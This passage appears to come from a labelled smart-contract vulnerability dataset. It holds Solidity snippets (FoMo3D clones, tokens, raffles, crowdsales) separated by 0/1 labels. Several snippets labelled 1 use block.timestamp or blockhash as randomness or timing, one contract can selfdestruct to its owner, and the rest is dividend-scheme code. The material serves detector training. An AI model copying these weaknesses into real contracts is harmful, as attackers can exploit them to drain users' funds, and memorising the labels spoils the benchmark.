= (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);                return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));    }        function withdrawEarnings(uint256 _pID)        private        returns(uint256)    {        updateGenVault(_pID, plyr_[_pID].lrnd);                uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);        if (_earnings > 0)        {            plyr_[_pID].win = 0;            plyr_[_pID].gen = 0;            plyr_[_pID].aff = 0;        }        return(_earnings);    }        function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private    {        _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);                emit F3Devents.onEndTx        (            _eventData_.compressedData,            _eventData_.compressedIDs,            plyr_[_pID].name,            msg.sender,            _eth,            _keys,            _eventData_.winnerAddr,            _eventData_.winnerName,            _eventData_.amountWon,            _eventData_.newPot,            _eventData_.P3DAmount,            _eventData_.genAmount,            _eventData_.potAmount,            airDropPot_        );    }    bool public activated_ = false;    function activate()        public    {        require( msg.sender == ceo, "ONLY ceo CAN activate" );        require(activated_ == false, "Already Activated");                activated_ = true;                rID_ = 1;        round_[1].strt = now + rndExtra_ - rndGap_;        round_[1].end = now + rndInit_ + rndExtra_;    }        function disable()        public    {        require( msg.sender == ceo, "ONLY ceo" );        selfdestruct(ceo);    }}library F3Ddatasets {    struct EventReturns {        uint256 compressedData;        uint256 compressedIDs;        address winnerAddr;                  bytes32 winnerName;                  uint256 amountWon;                   uint256 newPot;                      uint256 P3DAmount;                   uint256 genAmount;                   uint256 potAmount;               }    struct Player {        address addr;            bytes32 name;            uint256 win;             uint256 gen;             uint256 aff;             uint256 lrnd;            uint256 laff;        }    struct PlayerRounds {        uint256 eth;             uint256 keys;            uint256 mask;            uint256 ico;         }    struct Round {        uint256 plyr;            uint256 team;            uint256 end;             bool ended;              uint256 strt;            uint256 keys;            uint256 eth;             uint256 pot;             uint256 mask;            uint256 ico;             uint256 icoGen;          uint256 icoAvg;      }    struct TeamFee {        uint256 gen;             uint256 p3d;         }    struct PotSplit {        uint256 gen;             uint256 p3d;         }}library F3DKeysCalcLong {    using SafeMath for *;         function keysRec(uint256 _curEth, uint256 _newEth)        internal        pure        returns (uint256)    {        return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));    }             function ethRec(uint256 _curKeys, uint256 _sellKeys)        internal        pure        returns (uint256)    {        return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));    }         function keys(uint256 _eth)         internal        pure        returns(uint256)    {        return ((((((_eth).mul(1000000000000000000)).mul(31250000000000000000000000000)).add(56249882812561035156250000000000000000000000000000000000000000000000)).sqrt()).sub(7499992187500000000000000000000000)) / (15625000000);    }             function eth(uint256 _keys)         internal        pure        returns(uint256)      {        return ((7812500000).mul(_keys.sq()).add((7499992187500000).mul(_keys.mul(1000000000000000000)))) / ((1000000000000000000).sq()) ;    }}interface PlayerBookInterface {    function getPlayerID(address _addr) external returns (uint256);    function getPlayerName(uint256 _pID) external view returns (bytes32);    function getPlayerLAff(uint256 _pID) external view returns (uint256);    function getPlayerAddr(uint256 _pID) external view returns (address);    function getNameFee() external view returns (uint256);    function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);}library NameFilter {    function nameFilter(string _input)        internal        pure        returns(bytes32)    {        bytes memory _temp = bytes(_input);        uint256 _length = _temp.length;                require (_length <= 32 && _length > 0, "Invalid Length");        require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, "Can NOT start with SPACE");        if (_temp[0] == 0x30)        {            require(_temp[1] != 0x78, "CAN NOT Start With 0x");            require(_temp[1] != 0x58, "CAN NOT Start With 0X");        }                bool _hasNonNumber;                for (uint256 i = 0; i < _length; i++)        {                         if (_temp[i] > 0x40 && _temp[i] < 0x5b)            {                _temp[i] = byte(uint(_temp[i]) + 32);                if (_hasNonNumber == false)                    _hasNonNumber = true;            } else {                require                (                    _temp[i] == 0x20 ||                     (_temp[i] > 0x60 && _temp[i] < 0x7b) ||                    (_temp[i] > 0x2f && _temp[i] < 0x3a),                    "Include Illegal Characters!"                );                if (_temp[i] == 0x20)                    require( _temp[i+1] != 0x20,                     "ONLY One Space Allowed");                                if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))                    _hasNonNumber = true;                }        }                require(_hasNonNumber == true, "All Numbers Not Allowed");                bytes32 _ret;        assembly {            _ret := mload(add(_temp, 32))        }        return (_ret);    }}library SafeMath {    function mul(uint256 a, uint256 b)         internal         pure         returns (uint256 c)     {        if (a == 0) {            return 0;        }        c = a * b;        require(c / a == b, "Mul Failed");        return c;    }    function sub(uint256 a, uint256 b)        internal        pure        returns (uint256)     {        require(b <= a, "Sub Failed");        return a - b;    }    function add(uint256 a, uint256 b)        internal        pure        returns (uint256 c)     {        c = a + b;        require(c >= a, "Add Failed");        return c;    }        function sqrt(uint256 x)        internal        pure        returns (uint256 y)     {        uint256 z = ((add(x,1)) / 2);        y = x;        while (z < y)         {            y = z;            z = ((add((x / z),z)) / 2);        }    }    function sq(uint256 x)        internal        pure        returns (uint256)    {        return (mul(x,x));    }}
0<CODESPLIT>contract StandardBurnableToken is StandardToken {    event Burn(address indexed burner, uint256 value);         function burn(uint256 _value) public returns (bool) {        require(_value <= balances[msg.sender]);                          address burner = msg.sender;        balances[burner] = balances[burner].sub(_value);        totalSupply_ = totalSupply_.sub(_value);        emit Burn(burner, _value);        return true;    }}
1<CODESPLIT>contract Frozenable is Operational, StandardBurnableToken, ReentrancyGuard {    using DateTime for uint256;    struct FrozenRecord {        uint256 value;        uint256 unfreezeIndex;    }    uint256 public frozenBalance;    mapping (uint256 => FrozenRecord) public frozenRecords;    uint256 mulDecimals = 100000000;      event SystemFreeze(address indexed owner, uint256 value, uint256 unfreezeIndex);    event Unfreeze(address indexed owner, uint256 value, uint256 unfreezeTime);    function Frozenable(address _operator) Operational(_operator) public {}         function systemFreeze(uint256 _value, uint256 _unfreezeTime) internal {        uint256 unfreezeIndex = uint256(_unfreezeTime.parseTimestamp().year) * 10000 + uint256(_unfreezeTime.parseTimestamp().month) * 100 + uint256(_unfreezeTime.parseTimestamp().day);        balances[owner] = balances[owner].sub(_value);        frozenRecords[unfreezeIndex] = FrozenRecord({value: _value, unfreezeIndex: unfreezeIndex});        frozenBalance = frozenBalance.add(_value);        emit SystemFreeze(owner, _value, _unfreezeTime);    }              function unfreeze(uint256 timestamp) public returns (uint256 unfreezeAmount) {        require(timestamp <= block.timestamp);        uint256 unfreezeIndex = uint256(timestamp.parseTimestamp().year) * 10000 + uint256(timestamp.parseTimestamp().month) * 100 + uint256(timestamp.parseTimestamp().day);        frozenBalance = frozenBalance.sub(frozenRecords[unfreezeIndex].value);        balances[owner] = balances[owner].add(frozenRecords[unfreezeIndex].value);        unfreezeAmount = frozenRecords[unfreezeIndex].value;        emit Unfreeze(owner, unfreezeAmount, timestamp);        frozenRecords[unfreezeIndex].value = 0;        return unfreezeAmount;    }}
0<CODESPLIT>contract Releaseable is Frozenable {    using SafeMath for uint;    uint256 public createTime;    uint256 public standardReleaseAmount = mulDecimals.mul(512000);      uint256 public releaseAmountPerDay = mulDecimals.mul(512000);    uint256 public releasedSupply = 0;    event Release(address indexed receiver, uint256 value, uint256 sysAmount, uint256 releaseTime);    struct ReleaseRecord {        uint256 amount;          uint256 releaseIndex;      }    mapping (uint256 => ReleaseRecord) public releaseRecords;    function Releaseable(                    address _operator, uint256 _initialSupply                ) Frozenable(_operator) public {        createTime = 1528732800;        releasedSupply = _initialSupply;        balances[owner] = _initialSupply;        totalSupply_ = mulDecimals.mul(187140000);    }    function release(uint256 timestamp, uint256 sysAmount) public onlyOperator returns(uint256 _actualRelease) {        require(timestamp >= createTime && timestamp <= block.timestamp);        require(!checkIsReleaseRecordExist(timestamp));        updateReleaseAmount(timestamp);        require(sysAmount <= releaseAmountPerDay.mul(4).div(5));        require(totalSupply_ >= releasedSupply.add(releaseAmountPerDay));        balances[owner] = balances[owner].add(releaseAmountPerDay);        releasedSupply = releasedSupply.add(releaseAmountPerDay);        uint256 _releaseIndex = uint256(timestamp.parseTimestamp().year) * 10000 + uint256(timestamp.parseTimestamp().month) * 100 + uint256(timestamp.parseTimestamp().day);        releaseRecords[_releaseIndex] = ReleaseRecord(releaseAmountPerDay, _releaseIndex);        emit Release(owner, releaseAmountPerDay, sysAmount, timestamp);        systemFreeze(sysAmount.div(5), timestamp.add(180 days));        systemFreeze(sysAmount.mul(6).div(10), timestamp.add(200 years));        return releaseAmountPerDay;    }              function checkIsReleaseRecordExist(uint256 timestamp) internal view returns(bool _exist) {        bool exist = false;        uint256 releaseIndex = uint256(timestamp.parseTimestamp().year) * 10000 + uint256(timestamp.parseTimestamp().month) * 100 + uint256(timestamp.parseTimestamp().day);        if (releaseRecords[releaseIndex].releaseIndex == releaseIndex){            exist = true;        }        return exist;    }              function updateReleaseAmount(uint256 timestamp) internal {        uint256 timeElapse = timestamp.sub(createTime);        uint256 cycles = timeElapse.div(180 days);        if (cycles > 0) {            if (cycles <= 10) {                releaseAmountPerDay = standardReleaseAmount;                for (uint index = 0; index < cycles; index++) {                    releaseAmountPerDay = releaseAmountPerDay.div(2);                }            } else {                releaseAmountPerDay = 0;            }        }    }}
0<CODESPLIT>contract CoinCool is Releaseable {    string public standard = '2018061200';    string public name = 'CoolToken';    string public symbol = 'CT';    uint8 public decimals = 8;    function CoinCool() Releaseable(0x4068D7c2e286Cb1E72Cef90B74C823E990FaB9C2, mulDecimals.mul(3000000)) public {}}
1<CODESPLIT>contract RaffleStrangeLoop {    uint public chooseWinnerDeadline;    bytes32 public serverSeedHash;    function RaffleStrangeLoop(bytes32 secretHash) {        serverSeedHash = secretHash;        chooseWinnerDeadline = block.timestamp + 15 days;        return;    }}
1<CODESPLIT>contract MMaker {    mapping (uint8 => address) players;    uint8 number;    function randomtest() internal returns(uint8){        uint8 inter = uint8(uint256(keccak256(block.timestamp)) % number);        return uint8(uint256(keccak256(players[inter])) % number);    }}
1<CODESPLIT>contract SEEDCrowdsale {  uint256 public phase2StartTime;  uint256[6] public phase2Rates;  uint256[6] public phase2RateOffsets;  function getRate() public view returns (uint256) {    uint offset = block.timestamp - (phase2StartTime);    for (uint256 i = 0; i < phase2RateOffsets.length; i++) {      if (offset < phase2RateOffsets[i]) {        return phase2Rates[i];      }    }    return 0;  }}
1<CODESPLIT>contract FanCrowdsale {  uint256 public closingTime;  function hasClosed() public view returns (bool) {    return block.timestamp > closingTime;  }}
1<CODESPLIT>contract NBAOnlineLaunchPromotion {    address[] public depositors;    function randomContestant(uint256 contestants, uint256 seed) constant internal returns (uint256 result){        return addmod(uint256(block.blockhash(block.number-1)), seed, contestants);    }    function awardPrizes() external {        uint256 numContestants = depositors.length;        uint256 seed1 = numContestants + block.timestamp;        uint256 seed2 = seed1 + (numContestants * 2);                address randomDepositWinner1 = depositors[randomContestant(numContestants, seed1)];        address randomDepositWinner2 = depositors[randomContestant(numContestants, seed2)];        while(randomDepositWinner2 == randomDepositWinner1) {            randomDepositWinner2 = depositors[randomContestant(numContestants, seed2)];        }        return;    }}
1<CODESPLIT>contract OysterPearl {    uint256 public claimAmount;    mapping (address => uint256) public balanceOf;    mapping (address => uint) public claimed;    function claim(address _payout, address _fee) public {        require(claimed[msg.sender] == 1 || (block.timestamp - claimed[msg.sender]) >= 60);        balanceOf[msg.sender] -= claimAmount;        return;    }}
0<CODESPLIT>contract BreakTheBank {              modifier onlyBagholders() {        require(myTokens() > 0);        _;    }         modifier onlyStronghands() {        require(myDividends(true) > 0);        _;    }                                                 modifier onlyAdministrator(){        require(msg.sender == owner);        _;    }    modifier limitBuy() {        _;    }         event onTokenPurchase(        address indexed customerAddress,        uint256 incomingEthereum,        uint256 tokensMinted,        address indexed referredBy    );    event onTokenSell(        address indexed customerAddress,        uint256 tokensBurned,        uint256 ethereumEarned    );    event onReinvestment(        address indexed customerAddress,        uint256 ethereumReinvested,        uint256 tokensMinted    );    event onWithdraw(        address indexed customerAddress,        uint256 ethereumWithdrawn    );    event OnRedistribution (        uint256 amount,        uint256 timestamp    );         event Transfer(        address indexed from,        address indexed to,        uint256 tokens    );         string public name = "BreakTheBank.me";    string public symbol = "BTB";    uint8 constant public decimals = 18;    uint8 constant internal dividendFee_ = 20;      uint256 constant internal tokenPriceInitial_ = 0.0000001 ether;    uint256 constant internal tokenPriceIncremental_ = 0.00000001 ether;    uint256 constant internal magnitude = 2**64;         uint256 public stakingRequirement = 0;             mapping(address => uint256) internal tokenBalanceLedger_;    mapping(address => address) internal referralOf_;    mapping(address => uint256) internal referralBalance_;    mapping(address => int256) internal payoutsTo_;    mapping(address => bool) internal alreadyBought;    uint256 internal tokenSupply_ = 0;    uint256 internal profitPerShare_;    mapping(address => bool) internal whitelisted_;    bool internal whitelist_ = true;    bool internal limit = true;    address public owner;              constructor()        public    {        owner = msg.sender;        whitelisted_[msg.sender] = true;                          whitelist_ = true;    }             function buy(address _referredBy)        public        payable        returns(uint256)    {        purchaseTokens(msg.value, _referredBy);    }         function()        payable        public    {        purchaseTokens(msg.value, 0x0);    }         function reinvest()        onlyStronghands()        public    {                 uint256 _dividends = myDividends(false);                   address _customerAddress = msg.sender;        payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);                 _dividends += referralBalance_[_customerAddress];        referralBalance_[_customerAddress] = 0;                 uint256 _tokens = purchaseTokens(_dividends, 0x0);                 emit onReinvestment(_customerAddress, _dividends, _tokens);    }         function exit()        public    {                 address _customerAddress = msg.sender;        uint256 _tokens = tokenBalanceLedger_[_customerAddress];        if(_tokens > 0) sell(_tokens);                 withdraw();    }         function withdraw()        onlyStronghands()        public    {                 address _customerAddress = msg.sender;        uint256 _dividends = myDividends(false);                   payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);                 _dividends += referralBalance_[_customerAddress];        referralBalance_[_customerAddress] = 0;                 _customerAddress.transfer(_dividends);                 emit onWithdraw(_customerAddress, _dividends);    }         function sell(uint256 _amountOfTokens)        onlyBagholders()        public    {                 address _customerAddress = msg.sender;                 require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);        uint256 _tokens = _amountOfTokens;        uint256 _ethereum = tokensToEthereum_(_tokens);        uint256 _undividedDividends = SafeMath.div(SafeMath.mul(_ethereum, dividendFee_), 100);          uint256 _referralBonus = SafeMath.div(_undividedDividends, 2);          uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);        uint256 _taxedEthereum = SafeMath.sub(_ethereum, (_dividends));        address _referredBy = referralOf_[_customerAddress];        if(                         _referredBy != 0x0000000000000000000000000000000000000000 &&                         _referredBy != _customerAddress &&                                      tokenBalanceLedger_[_referredBy] >= stakingRequirement        ){                         referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], (_referralBonus / 2));              address tier2 = referralOf_[_referredBy];            if (tier2 != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[tier2] >= stakingRequirement) {                referralBalance_[tier2] = SafeMath.add(referralBalance_[tier2], (_referralBonus*30 / 100));                                   if (referralOf_[tier2] != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[referralOf_[tier2]] >= stakingRequirement) {                    referralBalance_[referralOf_[tier2]] = SafeMath.add(referralBalance_[referralOf_[tier2]], (_referralBonus*20 / 100));                      }                else {                    _dividends = SafeMath.add(_dividends, (_referralBonus*20 / 100));                }            }            else {                _dividends = SafeMath.add(_dividends, (_referralBonus*50 / 100));            }        } else {                                      _dividends = SafeMath.add(_dividends, _referralBonus);        }                 tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);                 int256 _updatedPayouts = (int256) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));        payoutsTo_[_customerAddress] -= _updatedPayouts;                 if (tokenSupply_ > 0) {                         profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);        }                 emit onTokenSell(_customerAddress, _tokens, _taxedEthereum);    }          function transfer(address _toAddress, uint256 _amountOfTokens)        onlyBagholders()        public        returns(bool)    {                 address _customerAddress = msg.sender;                 require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);                 if(myDividends(true) > 0) withdraw();                 tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);        tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _amountOfTokens);                 payoutsTo_[_customerAddress] -= (int256) (profitPerShare_ * _amountOfTokens);        payoutsTo_[_toAddress] += (int256) (profitPerShare_ * _amountOfTokens);                 emit Transfer(_customerAddress, _toAddress, _amountOfTokens);                 return true;    }         function redistribution()        external        payable    {                 uint256 ethereum = msg.value;                 profitPerShare_ = SafeMath.add(profitPerShare_, (ethereum * magnitude) / tokenSupply_);                 emit OnRedistribution(ethereum, block.timestamp);    }         function setAdministrator(address _newAdmin)        onlyAdministrator()        external    {        owner = _newAdmin;    }         function setStakingRequirement(uint256 _amountOfTokens)        onlyAdministrator()        public    {        stakingRequirement = _amountOfTokens;    }         function setName(string _name)        onlyAdministrator()        public    {        name = _name;    }         function setSymbol(string _symbol)        onlyAdministrator()        public    {        symbol = _symbol;    }              function totalEthereumBalance()        public        view        returns(uint)    {        return address(this).balance;    }         function totalSupply()        public        view        returns(uint256)    {        return tokenSupply_;    }         function myTokens()        public        view        returns(uint256)    {        address _customerAddress = msg.sender;        return balanceOf(_customerAddress);    }         function myDividends(bool _includeReferralBonus)        public        view        returns(uint256)    {        address _customerAddress = msg.sender;        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;    }         function balanceOf(address _customerAddress)        view        public        returns(uint256)    {        return tokenBalanceLedger_[_customerAddress];    }         function dividendsOf(address _customerAddress)        view        public        returns(uint256)    {        return (uint256) ((int256)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;    }         function sellPrice()        public        view        returns(uint256)    {                 if(tokenSupply_ == 0){            return tokenPriceInitial_ - tokenPriceIncremental_;        } else {            uint256 _ethereum = tokensToEthereum_(1e18);            uint256 _dividends = SafeMath.div(SafeMath.mul(_ethereum, dividendFee_),100);            uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);            return _taxedEthereum;        }    }         function buyPrice()        public        view        returns(uint256)    {                 if(tokenSupply_ == 0){            return tokenPriceInitial_ + tokenPriceIncremental_;        } else {            uint256 _ethereum = tokensToEthereum_(1e18);            uint256 _dividends = SafeMath.div(SafeMath.mul(_ethereum, dividendFee_),100);            uint256 _taxedEthereum = SafeMath.add(_ethereum, _dividends);            return _taxedEthereum;        }    }         function calculateTokensReceived(uint256 _ethereumToSpend)        public        view        returns(uint256)    {        uint256 _dividends = SafeMath.div(SafeMath.mul(_ethereumToSpend, dividendFee_),100);        uint256 _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);        return _amountOfTokens;    }         function calculateEthereumReceived(uint256 _tokensToSell)        public        view        returns(uint256)    {        require(_tokensToSell <= tokenSupply_);        uint256 _ethereum = tokensToEthereum_(_tokensToSell);        uint256 _dividends =  SafeMath.div(SafeMath.mul(_ethereum, dividendFee_), 100);        uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);        return _taxedEthereum;    }    function disableWhitelist() onlyAdministrator() external {        whitelist_ = false;    }         function purchaseTokens(uint256 _incomingEthereum, address _referredBy)        limitBuy()        internal        returns(uint256)    {                          if (whitelisted_[msg.sender] == false && whitelist_ == true) {            revert();        }                 address _customerAddress = msg.sender;        uint256 _undividedDividends = SafeMath.div(SafeMath.mul(_incomingEthereum, dividendFee_), 100);          uint256 _referralBonus = SafeMath.div(_undividedDividends, 2);          uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);        uint256 _taxedEthereum = SafeMath.sub(_incomingEthereum, (_undividedDividends));        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);        uint256 _fee = _dividends * magnitude;                                            require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));                 if(                         _referredBy != 0x0000000000000000000000000000000000000000 &&                         _referredBy != _customerAddress &&                                      tokenBalanceLedger_[_referredBy] >= stakingRequirement &&            referralOf_[_customerAddress] == 0x0000000000000000000000000000000000000000 &&            alreadyBought[_customerAddress] == false        ){            referralOf_[_customerAddress] = _referredBy;                         referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], (_referralBonus / 2));              address tier2 = referralOf_[_referredBy];            if (tier2 != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[tier2] >= stakingRequirement) {                referralBalance_[tier2] = SafeMath.add(referralBalance_[tier2], (_referralBonus*30 / 100));                                   if (referralOf_[tier2] != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[referralOf_[tier2]] >= stakingRequirement) {                    referralBalance_[referralOf_[tier2]] = SafeMath.add(referralBalance_[referralOf_[tier2]], (_referralBonus*20 / 100));                      }                else {                    _dividends = SafeMath.add(_dividends, (_referralBonus*20 / 100));                    _fee = _dividends * magnitude;                }            }            else {                _dividends = SafeMath.add(_dividends, (_referralBonus*50 / 100));                _fee = _dividends * magnitude;            }        } else {                                      _dividends = SafeMath.add(_dividends, _referralBonus);            _fee = _dividends * magnitude;        }                 if(tokenSupply_ > 0){                         tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);                         profitPerShare_ += (_dividends * magnitude / (tokenSupply_));                         _fee = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));        } else {                         tokenSupply_ = _amountOfTokens;        }                 tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);                          int256 _updatedPayouts = (int256) ((profitPerShare_ * _amountOfTokens) - _fee);        payoutsTo_[_customerAddress] += _updatedPayouts;        alreadyBought[_customerAddress] = true;                 emit onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);        return _amountOfTokens;    }         function ethereumToTokens_(uint256 _ethereum)        internal        view        returns(uint256)    {        uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18;        uint256 _tokensReceived =         (            (                                 SafeMath.sub(                    (sqrt                        (                            (_tokenPriceInitial**2)                            +                            (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))                            +                            (((tokenPriceIncremental_)**2)*(tokenSupply_**2))                            +                            (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)                        )                    ), _tokenPriceInitial                )            )/(tokenPriceIncremental_)        )-(tokenSupply_)        ;        return _tokensReceived;    }         function tokensToEthereum_(uint256 _tokens)        internal        view        returns(uint256)    {        uint256 tokens_ = (_tokens + 1e18);        uint256 _tokenSupply = (tokenSupply_ + 1e18);        uint256 _etherReceived =        (                         SafeMath.sub(                (                    (                        (                            tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))                        )-tokenPriceIncremental_                    )*(tokens_ - 1e18)                ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2            )        /1e18);        return _etherReceived;    }              function sqrt(uint x) internal pure returns (uint y) {        uint z = (x + 1) / 2;        y = x;        while (z < y) {            y = z;            z = (x / z + z) / 2;        }    }} library SafeMath {         function mul(uint256 a, uint256 b) internal pure returns (uint256) {        if (a == 0) {            return 0;        }        uint256 c = a * b;        assert(c / a == b);        return c;    }         function div(uint256 a, uint256 b) internal pure returns (uint256) {                 uint256 c = a / b;                 return c;    }         function sub(uint256 a, uint256 b) internal pure returns (uint256) {        assert(b <= a);        return a - b;    }         function add(uint256 a, uint256 b) internal pure returns (uint256) {        uint256 c = a + b;        assert(c >= a);        return c;    }}
0<CODESPLIT>contract FoMo3Dshort is modularShort {    using SafeMath for *;    using NameFilter for string;    using F3DKeysCalcShort for uint256;    PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0xa6407c2C318F5594e1d711E48C62F593D7Ad73D6);        address private admin = msg.sender;    string constant public name = "FOMO NOW";    string constant public symbol = "FNW";    uint256 private rndExtra_ = 30 minutes;          uint256 private rndGap_ = 30 minutes;              uint256 constant private rndInit_ = 30 minutes;                     uint256 constant private rndInc_ = 10 seconds;                   uint256 constant private rndMax_ = 1 hours;                         uint256 public airDropPot_;                  uint256 public airDropTracker_ = 0;          uint256 public rID_;            mapping (address => uint256) public pIDxAddr_;               mapping (bytes32 => uint256) public pIDxName_;               mapping (uint256 => F3Ddatasets.Player) public plyr_;        mapping (uint256 => mapping (uint256 => F3Ddatasets.PlayerRounds)) public plyrRnds_;         mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;         mapping (uint256 => F3Ddatasets.Round) public round_;        mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;              mapping (uint256 => F3Ddatasets.TeamFee) public fees_;               mapping (uint256 => F3Ddatasets.PotSplit) public potSplit_;              constructor()        public    {		                                     		                               fees_[0] = F3Ddatasets.TeamFee(32,0);            fees_[1] = F3Ddatasets.TeamFee(45,0);            fees_[2] = F3Ddatasets.TeamFee(62,0);           fees_[3] = F3Ddatasets.TeamFee(47,0);                              potSplit_[0] = F3Ddatasets.PotSplit(47,0);           potSplit_[1] = F3Ddatasets.PotSplit(47,0);            potSplit_[2] = F3Ddatasets.PotSplit(62,0);           potSplit_[3] = F3Ddatasets.PotSplit(62,0);   	}             modifier isActivated() {        require(activated_ == true, "its not ready yet.  check ?eta in discord");        _;    }         modifier isHuman() {        address _addr = msg.sender;        uint256 _codeLength;        assembly {_codeLength := extcodesize(_addr)}        require(_codeLength == 0, "sorry humans only");        _;    }         modifier isWithinLimits(uint256 _eth) {        require(_eth >= 1000000000, "pocket lint: not a valid currency");        require(_eth <= 100000000000000000000000, "no vitalik, no");        _;    }             function()        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 buyCore(_pID, plyr_[_pID].laff, 2, _eventData_);    }         function buyXid(uint256 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                          if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                 } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affCode, _team, _eventData_);    }    function buyXaddr(address _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxAddr_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affID, _team, _eventData_);    }    function buyXname(bytes32 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxName_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affID, _team, _eventData_);    }         function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                          if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                 } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affCode, _team, _eth, _eventData_);    }    function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxAddr_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }    function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = 